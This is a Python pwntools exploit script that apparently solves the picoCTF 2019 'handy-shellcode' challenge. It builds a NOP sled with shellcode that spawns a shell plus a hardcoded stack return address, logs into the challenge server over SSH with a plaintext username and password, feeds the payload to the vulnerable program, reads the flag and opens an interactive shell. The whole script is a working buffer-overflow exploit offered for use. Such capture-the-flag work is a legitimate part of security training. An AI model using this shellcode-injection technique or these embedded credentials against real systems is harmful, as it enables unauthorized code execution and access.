#!/usr/bin/python

from pwn import *

PADDING = 164

payload = asm(shellcraft.sh())
nopsled = '\x90' * (PADDING - len(payload))
stackAddr = p32(0xffffd22c)

exploit = nopsled + payload + stackAddr

s = ssh(host='2019shell1.picoctf.com', user='cihuisec', password='Narko123')

py = s.run('cd /problems/handy-shellcode_4_b724dbfabf610aaa4841af644535be30; ./vuln')
print py.recv()
py.sendline(exploit)
py.sendline('cat flag.txt')
py.interactive()
s.close()
